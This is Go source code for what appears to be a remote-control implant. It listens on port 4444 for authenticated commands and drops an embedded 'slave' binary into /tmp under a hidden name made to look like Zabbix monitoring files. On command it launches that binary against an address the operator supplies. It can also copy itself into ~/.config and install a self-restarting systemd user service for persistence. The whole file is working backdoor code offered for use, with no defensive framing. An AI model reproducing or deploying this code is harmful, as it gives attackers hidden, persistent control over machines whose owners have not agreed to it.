package main

import (
	_ "embed"
	"encoding/json"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"sync"
)

//go:embed slave
var slaveBinary []byte

var (
	token       string
	slaveCmd    *exec.Cmd
	slaveMu     sync.Mutex
	slavePID    int
	slaveAlive  bool
	slavePath   string
)

type CmdMessage struct {
	Cmd     string `json:"cmd"`
	Connect string `json:"connect,omitempty"`
}

type ResponseMessage struct {
	Status    string `json:"status,omitempty"`
	Error     string `json:"error,omitempty"`
	PID       int    `json:"pid,omitempty"`
	SlavePID  int    `json:"slave_pid,omitempty"`
	SlaveAlive bool  `json:"slave_alive,omitempty"`
}

func extractSlave() error {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("get home dir: %v", err)
	}

	// Create ~/.config/mslave if not exists
	configDir := filepath.Join(homeDir, ".config", ".zabbix")
	if err := os.MkdirAll(configDir, 0700); err != nil {
		return fmt.Errorf("create config dir: %v", err)
	}

	// Generate random hidden filename in /tmp
	randBytes := make([]byte, 8)
	for i := range randBytes {
		randBytes[i] = "0123456789abcdef"[os.Getpid()%16]
		// Simple randomization based on time
		randBytes[i] = "0123456789abcdef"[int64(i+os.Getpid())%16]
	}
	slaveFilename := fmt.Sprintf(".zabbix-tmp-%x", randBytes)
	slavePath = filepath.Join("/tmp", slaveFilename)

	// Write slave binary to /tmp
	if err := os.WriteFile(slavePath, slaveBinary, 0755); err != nil {
		return fmt.Errorf("write slave binary: %v", err)
	}

	fmt.Fprintf(os.Stderr, "extracted slave to %s\n", slavePath)
	return nil
}

func persistSelf() error {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return fmt.Errorf("get home dir: %v", err)
	}

	// Get path to current executable
	exePath, err := os.Executable()
	if err != nil {
		return fmt.Errorf("get executable: %v", err)
	}
	exePath, err = filepath.EvalSymlinks(exePath)
	if err != nil {
		return fmt.Errorf("resolve symlinks: %v", err)
	}

	// Read current executable
	exeData, err := os.ReadFile(exePath)
	if err != nil {
		return fmt.Errorf("read executable: %v", err)
	}

	// Copy to ~/.config/mslave/mslave
	configDir := filepath.Join(homeDir, ".config", "mslave")
	if err := os.MkdirAll(configDir, 0700); err != nil {
		return fmt.Errorf("create config dir: %v", err)
	}

	persistPath := filepath.Join(configDir, "mslave")
	if err := os.WriteFile(persistPath, exeData, 0755); err != nil {
		return fmt.Errorf("write persistent binary: %v", err)
	}

	fmt.Fprintf(os.Stderr, "persisted to %s\n", persistPath)

	// Install systemd user service
	serviceDir := filepath.Join(homeDir, ".config", "systemd", "user")
	if err := os.MkdirAll(serviceDir, 0755); err != nil {
		return fmt.Errorf("create service dir: %v", err)
	}

	servicePath := filepath.Join(serviceDir, "mslave.service")
	serviceContent := fmt.Sprintf(`[Unit]
Description=Zheng Mslave
After=network.target

[Service]
Type=simple
ExecStart=%s -listen 4444
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
`, persistPath)

	if err := os.WriteFile(servicePath, []byte(serviceContent), 0644); err != nil {
		return fmt.Errorf("write service file: %v", err)
	}

	// Enable and start user service
	cmds := [][]string{
		{"systemctl", "--user", "daemon-reload"},
		{"systemctl", "--user", "enable", "mslave.service"},
		{"systemctl", "--user", "start", "mslave.service"},
	}
	for _, cmd := range cmds {
		if out, err := exec.Command(cmd[0], cmd[1:]...).CombinedOutput(); err != nil {
			fmt.Fprintf(os.Stderr, "warning: %s: %v (%s)\n", cmd, err, string(out))
		}
	}

	return nil
}

func startSlave(connectAddr string) ResponseMessage {
	slaveMu.Lock()
	defer slaveMu.Unlock()

	// Kill existing slave if running
	if slaveCmd != nil && slaveCmd.Process != nil {
		slaveCmd.Process.Kill()
		slaveCmd.Wait()
		slaveCmd = nil
		slaveAlive = false
	}

	// Check if slave binary exists
	if _, err := os.Stat(slavePath); os.IsNotExist(err) {
		return ResponseMessage{Status: "failed", Error: "slave binary not found, run install first"}
	}

	cmd := exec.Command(slavePath, "-connect", connectAddr)
	cmd.Stdout = nil
	cmd.Stderr = nil

	if err := cmd.Start(); err != nil {
		return ResponseMessage{Status: "failed", Error: fmt.Sprintf("start slave: %v", err)}
	}

	slaveCmd = cmd
	slavePID = cmd.Process.Pid
	slaveAlive = true

	// Monitor slave in background
	go func() {
		cmd.Wait()
		slaveMu.Lock()
		if slaveCmd == cmd {
			slaveAlive = false
			slavePID = 0
		}
		slaveMu.Unlock()
	}()

	return ResponseMessage{Status: "started", PID: slavePID}
}

func stopSlave() ResponseMessage {
	slaveMu.Lock()
	defer slaveMu.Unlock()

	if slaveCmd == nil || slaveCmd.Process == nil {
		return ResponseMessage{Status: "not_running"}
	}

	slaveCmd.Process.Kill()
	slaveCmd.Wait()
	slaveCmd = nil
	slaveAlive = false
	slavePID = 0

	return ResponseMessage{Status: "stopped"}
}

func getSlaveStatus() ResponseMessage {
	slaveMu.Lock()
	defer slaveMu.Unlock()

	return ResponseMessage{
		Status:     "running",
		SlavePID:   slavePID,
		SlaveAlive: slaveAlive,
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	// HMAC authentication
	if err := handleAuth(conn, token); err != nil {
		fmt.Fprintf(os.Stderr, "auth failed from %s: %v\n", conn.RemoteAddr(), err)
		return
	}

	fmt.Fprintf(os.Stderr, "authenticated: %s\n", conn.RemoteAddr())

	// Command loop
	decoder := json.NewDecoder(conn)
	encoder := json.NewEncoder(conn)

	for {
		var msg CmdMessage
		if err := decoder.Decode(&msg); err != nil {
			fmt.Fprintf(os.Stderr, "connection closed: %v\n", err)
			return
		}

		var resp ResponseMessage
		switch msg.Cmd {
		case "start_slave":
			fmt.Fprintf(os.Stderr, "starting slave -> %s\n", msg.Connect)
			resp = startSlave(msg.Connect)

		case "stop_slave":
			fmt.Fprintf(os.Stderr, "stopping slave\n")
			resp = stopSlave()

		case "install_slave":
			fmt.Fprintf(os.Stderr, "extracting slave binary\n")
			if err := extractSlave(); err != nil {
				resp = ResponseMessage{Status: "failed", Error: err.Error()}
			} else {
				resp = ResponseMessage{Status: "extracted"}
			}

		case "status":
			resp = getSlaveStatus()

		case "persist":
			fmt.Fprintf(os.Stderr, "persisting self\n")
			if err := persistSelf(); err != nil {
				resp = ResponseMessage{Status: "failed", Error: err.Error()}
			} else {
				resp = ResponseMessage{Status: "persisted"}
			}

		case "ping":
			resp = ResponseMessage{Status: "pong"}

		default:
			resp = ResponseMessage{Status: "unknown_cmd", Error: msg.Cmd}
		}

		if err := encoder.Encode(resp); err != nil {
			fmt.Fprintf(os.Stderr, "send response: %v\n", err)
			return
		}
	}
}

func main() {
	listenPort := flag.String("listen", "4444", "port to listen on")
	tokenFile := flag.String("token", "", "path to file containing HMAC token (or use ZHENG_TOKEN env)")
	flag.Parse()

	// Load token
	if *tokenFile != "" {
		data, err := os.ReadFile(*tokenFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "failed to read token file: %v\n", err)
			os.Exit(1)
		}
		token = sanitizeToken(string(data))
	} else if os.Getenv("ZHENG_TOKEN") != "" {
		token = os.Getenv("ZHENG_TOKEN")
	} else {
		// Generate and display token on first run
		token = generateToken()
		fmt.Fprintf(os.Stderr, "no token provided, generated: %s\n", token)
		fmt.Fprintf(os.Stderr, "set ZHENG_TOKEN env or use -token flag\n")
	}

	// Extract slave binary to /tmp
	if err := extractSlave(); err != nil {
		fmt.Fprintf(os.Stderr, "failed to extract slave: %v\n", err)
		os.Exit(1)
	}

	// Persist self (copies to ~/.config/mslave, installs systemd user service)
	/*if err := persistSelf(); err != nil {
		fmt.Fprintf(os.Stderr, "warning: failed to persist: %v\n", err)
		// Continue running even if persistence fails
	}*/

	listener, err := net.Listen("tcp", ":"+*listenPort)
	if err != nil {
		fmt.Fprintf(os.Stderr, "failed to listen on :%s: %v\n", *listenPort, err)
		os.Exit(1)
	}
	defer listener.Close()

	fmt.Fprintf(os.Stderr, "mslave listening on :%s\n", *listenPort)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Fprintf(os.Stderr, "accept error: %v\n", err)
			continue
		}
		go handleConnection(conn)
	}
}
